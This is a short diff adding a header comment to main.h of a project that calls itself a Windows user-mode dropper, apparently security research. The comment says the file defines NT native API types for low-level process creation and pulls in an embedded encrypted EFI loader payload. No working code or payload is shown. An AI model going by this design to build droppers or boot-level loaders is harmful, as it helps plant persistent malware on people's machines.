@@ -1,3 +1,27 @@
+/*
+ * ============================================================
+ *  Project  : WhiteLotus — Windows User-Mode Dropper
+ *  File     : main.h
+ * ============================================================
+ *
+ *  Description:
+ *    Windows NT native API type definitions required by the
+ *    dropper: NT_RTL_USER_PROCESS_PARAMETERS, NT_PS_CREATE_INFO,
+ *    NT_PS_ATTRIBUTE_LIST, NtCreateUserProcess prototype, and
+ *    related process-creation constants. Also includes loader.h
+ *    which embeds the encrypted EFI loader payload array.
+ *
+ *  Purpose:
+ *    - Provide NT native API types for low-level process
+ *      parameter manipulation inside the dropper.
+ *
+ *  Author   : 0xbekoo
+ *  Blog     : https://0xbekoo.github.io
+ *  Updated  : 2026-05-21
+ *
+ * ============================================================
+ */
+
 #define WIN32_LEAN_AND_MEAN
 #define NOMINMAX
 
